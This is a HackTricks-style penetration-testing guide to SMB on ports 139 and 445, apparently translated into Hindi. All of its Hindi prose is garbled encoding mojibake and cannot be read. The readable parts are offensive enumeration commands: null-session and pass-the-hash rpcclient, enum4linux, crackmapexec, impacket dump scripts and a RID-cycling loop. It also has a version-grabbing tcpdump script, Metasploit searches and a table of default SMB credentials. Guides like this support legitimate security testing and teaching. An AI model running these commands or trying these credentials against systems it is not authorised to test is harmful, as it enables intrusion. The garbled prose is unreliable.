# 139,445 - Pentesting SMB

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## **рдкреЛрд░реНрдЯ 139**

**_рдиреЗрдЯрдмрд╛рдпреЛрд╕ (NetBIOS)_** рдПрдХ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ рд╕реНрдерд╛рдиреАрдп рдХреНрд╖реЗрддреНрд░ рдиреЗрдЯрд╡рд░реНрдХ (LAN) рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди, рдкреАрд╕реА рдФрд░ рдбреЗрд╕реНрдХрдЯреЙрдк рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдФрд░ **рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдХреЗ рдкреНрд░реЗрд╖рдг рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред** рдиреЗрдЯрдмрд╛рдпреЛрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдХрд╛рдо рдХрд░ рд░рд╣реЗ рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рд╕реНрдерд╛рди рдЙрдирдХреЗ рдиреЗрдЯрдмрд╛рдпреЛрд╕ рдирд╛рдореЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрддреА рд╣реИ, рдЬреЛ 16 рд╡рд░реНрдгреЛрдВ рддрдХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдХреНрд╕рд░ рдХрдВрдкреНрдпреВрдЯрд░ рдирд╛рдо рд╕реЗ рдЕрд▓рдЧ рд╣реЛрддреЗ рд╣реИрдВред рджреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдмреАрдЪ рдПрдХ рдиреЗрдЯрдмрд╛рдпреЛрд╕ рд╕рддреНрд░ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди (рдЬреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░ рд░рд╣рд╛ рд╣реИ) рдПрдХ рдЕрдиреНрдп рдПрдкреНрд▓рд┐рдХреЗрд╢рди (рдЬреЛ рд╕рд░реНрд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░ рд░рд╣рд╛ рд╣реИ) рдХреЛ "рдХреЙрд▓" рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **TCP рдкреЛрд░реНрдЯ 139** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```
## рдкреЛрд░реНрдЯ 445

рддрдХрдиреАрдХреА рд░реВрдк рд╕реЗ, рдкреЛрд░реНрдЯ 139 рдХреЛ 'NBT рдУрд╡рд░ рдЖрдИрдкреА' рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдВрджрд░реНрднрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ рдкреЛрд░реНрдЯ 445 рдХреЛ 'SMB рдУрд╡рд░ рдЖрдИрдкреА' рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣рдЪрд╛рдирд╛ рдЧрдпрд╛ рд╣реИред рдПрдХреНрд░реЛрдирд╛рдЗрдо **SMB** 'рд╕рд░реНрд╡рд░ рдореИрд╕реЗрдЬ рдмреНрд▓реЙрдХреНрд╕' рдХреЗ рд▓рд┐рдП рд╣реИ, рдЬрд┐рд╕реЗ рдЖрдзреБрдирд┐рдХ рд░реВрдк рд╕реЗ **рдХреЙрдорди рдЗрдВрдЯрд░рдиреЗрдЯ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо (CIFS)** рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рд╕реНрддрд░ рдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд░реВрдк рдореЗрдВ, SMB/CIFS рдХрд╛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ, рдкреНрд░рд┐рдВрдЯрд░, рд╕реАрд░рд┐рдпрд▓ рдкреЛрд░реНрдЯреНрд╕ рддрдХ рдХрд╛ рд╕рд╛рдЭрд╛ рдЙрдкрдпреЛрдЧ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдФрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рдиреЛрдбреНрд╕ рдХреЗ рдмреАрдЪ рд╡рд┐рднрд┐рдиреНрди рдкреНрд░рдХрд╛рд░ рдХреА рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, Windows рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ, рдЗрд╕ рдмрд╛рдд рдкрд░ рдЬреЛрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ SMB рд╕реАрдзреЗ TCP/IP рдХреЗ рдУрд╡рд░ рдХрд╛рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ, NetBIOS over TCP/IP рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдЦрддреНрдо рдХрд░рддреЗ рд╣реБрдП, рдкреЛрд░реНрдЯ 445 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдЙрд▓реНрдЯреЗ, рд╡рд┐рднрд┐рдиреНрди рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░, рдкреЛрд░реНрдЯ 139 рдХрд╛ рдЙрдкрдпреЛрдЧ рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕реНрдкрд╖реНрдЯ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ SMB NetBIOS over TCP/IP рдХреЗ рд╕рд╛рде рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИред
```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```
### SMB

**рд╕рд░реНрд╡рд░ рд╕рдВрджреЗрд╢ рдмреНрд▓реЙрдХ (SMB)** рдкреНрд░реЛрдЯреЛрдХреЙрд▓, рдЬреЛ рдПрдХ **рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд░реНрд╡рд░** рдореЙрдбрд▓ рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, **рдлрд╝рд╛рдЗрд▓реЛрдВ**, рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ, рдФрд░ рдкреНрд░рд┐рдВрдЯрд░ рдФрд░ рд░рд╛рдЙрдЯрд░ рдЬреИрд╕реЗ рдЕрдиреНрдп рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдХрд╛ рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **Windows** рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХреЗ рднреАрддрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, SMB рдкрд┐рдЫрд▓реЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рд╕рдВрдЧрддрддрд╛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдХреЗ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдирдП рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдХрд░рдг рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдг рдЪрд▓рд╛ рд╕рдХреЗрдВред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, **Samba** рдкрд░рд┐рдпреЛрдЬрдирд╛ рдПрдХ рдореБрдлреНрдд рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕рдорд╛рдзрд╛рди рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ SMB рдХрд╛ рдЕрдорд▓ **Linux** рдФрд░ Unix рд╕рд┐рд╕реНрдЯрдореЛрдВ рдкрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ SMB рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

рдПрдХ SMB рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╢реЗрдпрд░, **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд╡рд┐рднрд┐рдиреНрди рд╣рд┐рд╕реНрд╕реЗ** рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рд╕рд░реНрд╡рд░ рдХреА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдВрд░рдЪрдирд╛ рд╕реЗ рдЖрдВрд╢рд┐рдХ рд░реВрдк рд╕реЗ **рд╕реНрд╡рддрдВрддреНрд░** рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред **рдкрд╣реБрдВрдЪ рдирд┐рдпрдВрддреНрд░рдг рд╕реВрдЪреА (ACLs)**, рдЬреЛ **рдкрд╣реБрдВрдЪ рдЕрдзрд┐рдХрд╛рд░** рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддреА рд╣реИрдВ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдкрд░ **рд╕реВрдХреНрд╖реНрдо рдирд┐рдпрдВрддреНрд░рдг** рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ **`рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди`**, **`рдкрдврд╝рдирд╛`**, рдФрд░ **`рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ`** рдЬреИрд╕реА рд╡рд┐рд╢реЗрд╖рддрд╛рдПрдБ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдпрд╛ рд╕рдореВрд╣реЛрдВ рдХреЛ рд╢реЗрдпрд░реЛрдВ рдкрд░ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдФрд░ рдпреЗ рд╕рд░реНрд╡рд░ рдкрд░ рд╕реНрдерд╛рдиреАрдп рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╕реЗ рднрд┐рдиреНрди рд╣реЛрддреА рд╣реИрдВред

### IPC$ рд╢реЗрдпрд░

IPC$ рд╢реЗрдпрд░ рддрдХ рдкрд╣реБрдВрдЪ рдПрдХ рдирд┐рд╖реНрдХрд░реНрд╖ рд╢реВрдиреНрдп рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдЬрд╛рдЧрд░рд┐рдд рд╕реЗрд╡рд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдЙрдкрдпреЛрдЧрд┐рддрд╛ `enum4linux` рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЙрдкрдпреБрдХреНрдд рд╣реИред рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдП, рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ:

- рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдЬрд╛рдирдХрд╛рд░реА
- рдореВрд▓ рдбреЛрдореЗрди рдкрд░ рд╡рд┐рд╡рд░рдг
- рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдФрд░ рд╕рдореВрд╣реЛрдВ рдХрд╛ рд╕рдВрдХрд▓рди
- рдЙрдкрд▓рдмреНрдз SMB рд╢реЗрдпрд░реЛрдВ рдкрд░ рдЬрд╛рдирдХрд╛рд░реА
- рдкреНрд░рднрд╛рд╡реА рд╕рд┐рд╕реНрдЯрдо рд╕реБрд░рдХреНрд╖рд╛ рдиреАрддрд┐

рдпрд╣ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ SMB (рд╕рд░реНрд╡рд░ рд╕рдВрджреЗрд╢ рдмреНрд▓реЙрдХ) рд╕реЗрд╡рд╛рдУрдВ рдкрд░ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдерд┐рддрд┐ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред `enum4linux` рд▓рдХреНрд╖реНрдп рд╕рд┐рд╕реНрдЯрдо рдХреЗ SMB рд╡рд╛рддрд╛рд╡рд░рдг рдХрд╛ рд╡реНрдпрд╛рдкрдХ рджреГрд╢реНрдп рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╕рдВрднрд╛рд╡рд┐рдд рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдФрд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ SMB рд╕реЗрд╡рд╛рдПрдВ рдареАрдХ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИрдВред
```bash
enum4linux -a target_ip
```
## рдХреНрдпрд╛ рд╣реИ рдПрдирдЯреАрдПрд▓рдПрдо

рдЕрдЧрд░ рдЖрдкрдХреЛ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ рдПрдирдЯреАрдПрд▓рдПрдо рдХреНрдпрд╛ рд╣реИ рдпрд╛ рдЖрдк рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдпрд╣ рдкреГрд╖реНрда рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рд▓рдЧреЗрдЧрд╛ рдЬрд╣рд╛рдВ **рдПрдирдЯреАрдПрд▓рдПрдо** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЧрдИ рд╣реИ рдФрд░ рдпрд╣ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ **рдХрд┐ рдпрд╣ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреИрд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЖрдк рдЗрд╕рдХрд╛ рд▓рд╛рдн рдХреИрд╕реЗ рдЙрдард╛ рд╕рдХрддреЗ рд╣реИрдВ:**

{% content-ref url="../windows-hardening/ntlm/" %}
[ntlm](../windows-hardening/ntlm/)
{% endcontent-ref %}

## **рд╕рд░реНрд╡рд░ рдЬрд╛рдВрдЪ**

### **рд╕реНрдХреИрди** рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
nbtscan -r 192.168.0.1/24
```
### SMB рд╕рд░реНрд╡рд░ рд╕рдВрд╕реНрдХрд░рдг

SMB рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд рджреБрд░реБрдкрдпреЛрдЧ рдХреА рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдХреМрди рд╕рд╛ рд╕рдВрд╕реНрдХрд░рдг рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рдпрджрд┐ рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдЕрдиреНрдп рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рдирд╣реАрдВ рджрд┐рдЦрд╛рдИ рджреЗрддреА рд╣реИ, рддреЛ рдЖрдк:

* **MSF** рдЕрддреНрдпрд╛рд╡рд╢реНрдпрдХ рдореЙрдбреНрдпреВрд▓ \_**auxiliary/scanner/smb/smb\_version** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ
* рдпрд╛ рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```
### **рдЦреЛрдЬ рд╢реЛрдз**
```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```
### **рд╕рдВрднрд╛рд╡рд┐рдд** рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓

| **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо(рдПрд╕)** | **рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рд╕рд╡рд░реНрдб**                      |
| -------------------- | ----------------------------------------- |
| _(рдЦрд╛рд▓реА)_            | _(рдЦрд╛рд▓реА)_                                 |
| guest                | _(рдЦрд╛рд▓реА)_                                 |
| Administrator, admin | _(рдЦрд╛рд▓реА)_, рдкрд╛рд╕рд╡рд░реНрдб, рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░, рдПрдбрдорд┐рди |
| arcserve             | arcserve, рдмреИрдХрдЕрдк                          |
| tivoli, tmersrvd     | tivoli, tmersrvd, рдПрдбрдорд┐рди                   |
| backupexec, backup   | backupexec, рдмреИрдХрдЕрдк, рдЖрд░реНрдХрд╛рдбрд╛                |
| test, lab, demo      | рдкрд╛рд╕рд╡рд░реНрдб, test, lab, demo                 |

### рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕

* [**SMB рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕**](../generic-methodologies-and-resources/brute-force.md#smb)

### SMB рдкрд░рд┐рд╡реЗрд╢ рд╕реВрдЪрдирд╛

### рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>
nmap --script "safe or smb-enum-*" -p 445 <IP>

#Connect to the rpc
rpcclient -U "" -N <IP> #No creds
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash
rpcclient -U "username%passwd" <IP> #With creds
#You can use querydispinfo and enumdomusers to query user information

#Dump user information
/usr/share/doc/python3-impacket/examples/samrdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/samrdump.py -port 445 [[domain/]username[:password]@]<targetName or address>

#Map possible RPC endpoints
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 135 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 139 [[domain/]username[:password]@]<targetName or address>
/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```
### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛, рд╕рдореВрд╣ рдФрд░ рд▓реЙрдЧ рдЗрди рдХрд┐рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдкрд╣рд▓реЗ рд╕реЗ рд╣реА enum4linux рдФрд░ enum4linux-ng рд╕реЗ рдПрдХрддреНрд░ рдХреА рдЬрд╛ рдЪреБрдХреА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```
### рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)
```bash
lookupsid.py -no-pass hostname.local
```
# рдПрдХрд▓рд╛рдЗрдирд░
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
### Metasploit - рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
use auxiliary/scanner/smb/smb_lookupsid
set rhosts hostname.local
run
```
### **LSARPC рдФрд░ SAMR rpcclient рдХрд╛ рдЬрд╛рдБрдЪ рдХрд░рдирд╛**

{% content-ref url="pentesting-smb/rpcclient-enumeration.md" %}
[rpcclient-enumeration.md](pentesting-smb/rpcclient-enumeration.md)
{% endcontent-ref %}

### рд▓рд┐рдирдХреНрд╕ рд╕реЗ GUI рдХрдиреЗрдХреНрд╢рди

#### рдЯрд░реНрдорд┐рдирд▓ рдореЗрдВ:

`xdg-open smb://cascade.htb/`

#### рдлрд╝рд╛рдЗрд▓ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рд╡рд┐рдВрдбреЛ (nautilus, thunar, рдЖрджрд┐)

`smb://friendzone.htb/general/`

## рд╕рд╛рдЭрд╛ рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреА рдЬрд╛рдБрдЪ

